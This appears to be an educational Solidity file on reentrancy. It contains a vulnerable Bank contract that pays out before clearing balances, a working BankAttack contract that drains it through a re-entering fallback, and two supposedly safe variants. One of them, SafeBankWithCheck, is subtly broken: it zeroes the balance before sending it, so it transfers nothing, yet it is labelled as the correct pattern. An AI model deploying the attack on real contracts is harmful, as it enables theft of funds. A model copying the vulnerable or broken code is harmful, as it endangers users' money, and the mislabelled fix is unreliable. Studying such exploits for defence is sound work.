// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Bank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0);
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "send ETH failed");
        balances[msg.sender] = 0;
    }
}

contract SafeBankWithCheck {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // checks first
        require(balances[msg.sender] > 0, "insufficient balance");
        // effects second
        balances[msg.sender] = 0;
        // interactions last
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "transfer failed");
    }
}

contract BankAttack {
    Bank bank;

    function setBankContract(address bankContract) public {
        bank = Bank(bankContract);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}

contract SafeBankWithReentrancyGuard is ReentrancyGuard {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0);
        balances[msg.sender] = 0;
        payable(msg.sender).transfer(balance);
    }
}
